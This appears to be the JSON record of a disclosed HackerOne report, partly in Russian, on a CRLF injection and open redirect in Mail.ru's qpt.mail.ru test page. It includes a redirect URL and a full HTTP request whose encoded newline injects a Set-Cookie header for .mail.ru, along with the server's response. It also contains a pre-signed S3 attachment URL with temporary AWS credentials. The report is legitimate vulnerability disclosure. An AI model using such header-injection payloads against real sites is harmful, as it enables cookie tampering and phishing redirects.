{"id":181939,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE5Mzk=","url":"https://hackerone.com/reports/181939","title":"[qpt.mail.ru] CRLF Injection / Open Redirect","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-11-13T17:00:04.415Z","submitted_at":"2016-11-13T17:00:04.415Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-02T13:18:14.817Z","bug_reporter_agreed_on_going_public_at":"2017-03-01T19:47:06.608Z","team_member_agreed_on_going_public_at":"2017-03-02T13:18:14.776Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Уязвимый сценарий**: /tests/\n**Уязвимый параметр**: qpt_question_url\n\n**Пример Open Redirect**:\nhttp://qpt.mail.ru/tests/?action=answer\u0026test_id=149\u0026qpt_question_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru.blackfan.ru\u0026qpt_result_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru%2Ftest.html\u0026question_id=1406\u0026qpt_test_state=1406%3A0\u0026answer=6449\n\n**Пример CRLF Injection** (Set-Cookie: test=inj; domain=.mail.ru):\nhttps://blackfan.ru/bugbounty/qpt.mail.ru_gfunjgblnjfgilzugniurg.html\n\nТело ответа перезаписать не удалось, но учитывая, что Location заголовок пропадает и строка странно обрабатывается (Set-cookie=test=test заменяется на Set-cookie: test=test), теоретически можно довести до чего-нибудь более интересного.\n\n**HTTP Request**\n```http\nPOST /tests/ HTTP/1.1\nHost: qpt.mail.ru\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 245\n\naction=answer\u0026test_id=149\u0026qpt_question_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru/%0aSet-Cookie=test=test%3bdomain=.mail.ru%3b\u0026qpt_result_url=http%3A%2F%2Fcard.krugdoveriya.mail.ru%2Ftest.html\u0026question_id=1406\u0026qpt_test_state=1406%3A0\u0026answer=6449\n```\n\n**HTTP Response**\n```http\nHTTP/1.1 302 Moved Temporarily\nServer: nginx\nDate: Sun, 13 Nov 2016 16:56:01 GMT\nContent-Type: text/html; charset=windows-1251\nConnection: keep-alive\nStatus: 302 Moved Temporarily\nCache-control: no-cache\nSet-cookie: test=inj;domain=.mail.ru;?qpt_test_state=1407%3a0%3a1406-6449\u0026test_id=149\u0026question_id=1407\nContent-Length: 0\n```","weakness":{"id":1,"name":"HTTP Response Splitting"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":134479,"file_name":"qpt.mail.ru_gfunjgblnjfgilzugniurg.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/134/479/c97b7a5dfb548a86627b6f09edafeb0c109a4f3a/qpt.mail.ru_gfunjgblnjfgilzugniurg.html?response-content-disposition=attachment%3B%20filename%3D%22qpt.mail.ru_gfunjgblnjfgilzugniurg.html%22%3B%20filename%2A%3DUTF-8%27%27qpt.mail.ru_gfunjgblnjfgilzugniurg.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSZC7DXM7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135500Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQC%2BDPA%2BSA%2BpuJvH4UEzvWiP4UFbtskzj7xfN6rqlPo4hwIhAOElSqCIqXNISLvxjY33BSsqOOcMi8dDWLDb%2FHD9us3YKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwLzMOGCwg6RS74p74q1wP3%2BrYZeAM77Rmdm64%2BCSKI7bN93GsX7JZ2tRccS6J5LGMRJTs%2By2W6iZRVDq3XbBt0e6p3WHVjfBqyc9ME6wkTlY9d%2Fv3J1DB8BCqWSb%2BRKzvSiDC8qrGE542%2FrwTG4%2F%2F%2B2GZboS%2Bwx6a4S2dscyeGXoZ%2FpJf5Uq70DiwjHjChb4otA36pPHn6Cbuljknt8dm165HwajfM%2FYT9DsRnV1w0OsaZyXvEEhwGsPTVDhkOXnM85nNGqSZ3QDaL%2FFoqr9dtCpsUJbXrXwy5kt3x0oz1dJ01X%2BzIddVtQMPL2ptVZ7U9zvXOF0wODPRFZiOr31TkuvFOSwxvOXUum3Wvfo9vzLL2sp7049bpk2pDp0SX1ErSpZmBqjAE1Syh%2Bgl%2BQXOk5uGw1WkZ%2Bi%2BVM0miZCx%2Fzk0YwCnQVNh8OZjtqzLjisdsfijlbUNbtSb%2F2rqQk5byOsnNd8EOB%2Fk4YSlr9Ml9Z%2FBjM39hyAylCG6PZXUBPl4i%2FIRvue2kJRbtUIpgVYXpDngioq0oVUItMzpWv1Dpeb3i%2BGYq1GpN7Q2SSm%2FKrlHtq%2FAe%2FUyoxvBMaLL9j8sY6VSMaDAw3WBbjN8GeRsrk6lj%2FvPn7De7XtYE3zRUmOhj70LaDvgw%2FfCQiwY6pAEB7X%2FT8tdYZNLCr%2BSBWKV0iIWafrBI43qKIrIcnQBlJSwVNOZ8Gcvl0OoNDa0QYgNpFyVQok8yJDR3W7a4ZqF2ZSs2yTdzPkNqbsgUkg9RTuuVzr%2BJ0IWfPqfOclYjbyvg8xSLdadzgsszfk0wXK8O0D9utoO42Qj4fAyRHUrDx8JxY18uWRPyFpidRfVqDlD%2FMzGvphFE58fBjncDPhIagYIJNw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e3685e429fc7b8acbbc23f7a8fc4a77be033d65abe4fe43b78a2fe8d0bcb46e2","file_size":975,"type":"text/html"}],"allow_singular_disclosure_at":"2017-03-31T19:47:06.645Z","allow_singular_disclosure_after":-142970874.07690287,"singular_disclosure_allowed":true,"vote_count":6,"voters":["delimitry","bobrov","samincube","eveeez","sumit7","spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1297117,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2016-11-13T17:48:18.056Z","updated_at":"2016-11-13T17:48:18.056Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":7380,"new_severity_id":7385},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1297119,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\n\nПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.\n\nК сожалению, баг не входит в область действия программы денежного вознаграждения за найденные уязвимости, но мы искренне признательны вам за то, что вы сообщили о нем и помогаете нам стать чуть-чуть лучше.","automated_response":false,"created_at":"2016-11-13T17:48:52.990Z","updated_at":"2016-11-13T17:48:52.990Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1297189,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2016-11-13T19:14:45.207Z","updated_at":"2016-11-13T19:14:45.207Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1386054,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет, бага закрыта.\nПожалуйста, подтвердите, что проблема больше не воспроизводится. \n","automated_response":false,"created_at":"2016-12-26T14:29:37.641Z","updated_at":"2016-12-26T14:29:37.641Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1386058,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Возвращается 404 на qpt.mail.ru, а на сайте, с которого я попал на qpt.mail.ru, сейчас нет опросов.\nЕсли так и должно быть, то скорее всего проблема больше не воспроизводится.","automated_response":false,"created_at":"2016-12-26T14:34:54.864Z","updated_at":"2016-12-26T14:34:54.864Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1386064,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Это такой своеобразный фикс","automated_response":false,"created_at":"2016-12-26T14:41:21.739Z","updated_at":"2016-12-26T14:41:21.739Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1514121,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-01T19:47:06.625Z","updated_at":"2017-03-01T19:47:06.625Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1515527,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-02T13:18:14.793Z","updated_at":"2017-03-02T13:18:14.793Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1515528,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-03-02T13:18:14.832Z","updated_at":"2017-03-02T13:18:14.832Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}